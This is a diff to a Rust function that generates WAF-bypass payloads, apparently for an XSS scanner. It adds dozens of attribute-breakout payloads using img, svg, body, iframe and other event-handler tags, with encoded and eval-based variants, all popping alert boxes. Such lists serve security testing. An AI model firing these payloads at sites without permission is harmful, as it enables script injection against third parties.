@@ -365,7 +365,7 @@ pub fn generate_waf_bypass() -> Vec<String> {
         "<script>aLeRt(1)</script>".to_string(),
     ]);
 
-    // Attribute breaking
+    // Attribute breaking - script tag injection
     payloads.extend(vec![
         "\"><script>alert(1)</script>".to_string(),
         "'><script>alert(1)</script>".to_string(),
@@ -375,6 +375,69 @@ pub fn generate_waf_bypass() -> Vec<String> {
         "</textarea><script>alert(1)</script>".to_string(),
         "</style><script>alert(1)</script>".to_string(),
         "</noscript><script>alert(1)</script>".to_string(),
+    ]);
+
+    // CRITICAL: Attribute breakout + img/svg/body tag injection (most common real-world XSS)
+    payloads.extend(vec![
+        // Double quote breakout + img onerror (MOST COMMON)
+        "\"><img src=x onerror=alert(1)>".to_string(),
+        "\"><img src=x onerror=\"alert(1)\">".to_string(),
+        "\"><img/src=x onerror=alert(1)>".to_string(),
+        "\"><img src=1 onerror=alert(1)>".to_string(),
+        "\" ><img src=x onerror=alert(1)>".to_string(),
+        // Single quote breakout + img onerror
+        "'><img src=x onerror=alert(1)>".to_string(),
+        "'><img src=x onerror='alert(1)'>".to_string(),
+        "'><img/src=x onerror=alert(1)>".to_string(),
+        "' ><img src=x onerror=alert(1)>".to_string(),
+        // Unquoted attribute breakout
+        "><img src=x onerror=alert(1)>".to_string(),
+        "> <img src=x onerror=alert(1)>".to_string(),
+        // SVG onload variants (often bypasses WAFs)
+        "\"><svg onload=alert(1)>".to_string(),
+        "\"><svg/onload=alert(1)>".to_string(),
+        "'><svg onload=alert(1)>".to_string(),
+        "'><svg/onload=alert(1)>".to_string(),
+        "><svg onload=alert(1)>".to_string(),
+        "><svg/onload=alert(1)>".to_string(),
+        // Body onload variants
+        "\"><body onload=alert(1)>".to_string(),
+        "'><body onload=alert(1)>".to_string(),
+        "><body onload=alert(1)>".to_string(),
+        // Input autofocus onfocus
+        "\"><input autofocus onfocus=alert(1)>".to_string(),
+        "'><input autofocus onfocus=alert(1)>".to_string(),
+        "><input autofocus onfocus=alert(1)>".to_string(),
+        // Details ontoggle
+        "\"><details open ontoggle=alert(1)>".to_string(),
+        "'><details open ontoggle=alert(1)>".to_string(),
+        "><details open ontoggle=alert(1)>".to_string(),
+        // Video/audio onerror
+        "\"><video src=x onerror=alert(1)>".to_string(),
+        "'><video src=x onerror=alert(1)>".to_string(),
+        "\"><audio src=x onerror=alert(1)>".to_string(),
+        "'><audio src=x onerror=alert(1)>".to_string(),
+        // Iframe onload
+        "\"><iframe onload=alert(1)>".to_string(),
+        "'><iframe onload=alert(1)>".to_string(),
+        // Marquee onstart (legacy but sometimes works)
+        "\"><marquee onstart=alert(1)>".to_string(),
+        "'><marquee onstart=alert(1)>".to_string(),
+        // Object onerror
+        "\"><object data=x onerror=alert(1)>".to_string(),
+        "'><object data=x onerror=alert(1)>".to_string(),
+        // Embed onerror
+        "\"><embed src=x onerror=alert(1)>".to_string(),
+        "'><embed src=x onerror=alert(1)>".to_string(),
+        // With different payloads (not just alert)
+        "\"><img src=x onerror=prompt(1)>".to_string(),
+        "\"><img src=x onerror=confirm(1)>".to_string(),
+        "\"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>".to_string(),
+        // URL encoded variants
+        "%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E".to_string(),
+        "%27%3E%3Cimg%20src=x%20onerror=alert(1)%3E".to_string(),
+        // HTML entity encoded variants
+        "&quot;&gt;&lt;img src=x onerror=alert(1)&gt;".to_string(),
     ]);
 
     // Tag breaking
